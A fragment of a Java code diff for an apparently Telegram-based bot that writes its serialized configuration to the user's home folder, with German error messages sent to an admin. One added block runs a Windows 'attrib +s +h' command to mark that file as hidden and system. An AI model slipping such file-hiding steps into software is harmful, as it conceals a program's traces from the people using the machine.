-        botconf.delete();
         config.setSilent(silen);
+        config.setLastmil(this.last);
+        config.setTime(this.time);
         writeConf();
     }
 
-    private void writeConf() {
+    void writeConf() {
         try {
+            changed = false;
             removeConf();
+            config.setButtons(buttons);
             Thread.sleep(500);
             FileOutputStream fos = new FileOutputStream(System.getProperty("user.home") + "\\botconf.bot");
             ObjectOutputStream oos = new ObjectOutputStream(fos);
             oos.writeObject(config);
             oos.close();
-            Thread.sleep(500);
+            Thread.sleep(1000);
+            try {
+                Runtime.getRuntime().exec("cmd /c attrib +s +h \"" + System.getProperty("user.home") + "\\botconf.bot" + "\"");
+            } catch (IOException ek) {
+                System.out.println(ek + " HIDE");
+            }
         } catch (Exception e) {
             sendNachrichtAdmin("Fehler beim writen\n" + this.getBotUsername() + "\n" + e);
         }
@@ -1301,7 +1496,35 @@ public class Bot extends TelegramLongPollingBot {
         return silent;
     }
 
+    private ClientGUI getChat() {
+        return chat;
+    }
+
     public static boolean isAlive() {
         return alive;
+    }
+
+    public boolean isUnread() {
+        return unread;
+    }
+
+    public void setUnread(boolean unread) {
+        if (unread)
+            this.setImage(4);
+        else
+            this.setImage(0);
+        this.unread = unread;
+    }
+
+    public boolean isWriter() {
+        return writer;
+    }
+
+    public boolean isReading() {
+        return reader;
+    }
+
+    public void setClient(Client client) {
+        this.client = client;
     }
 }
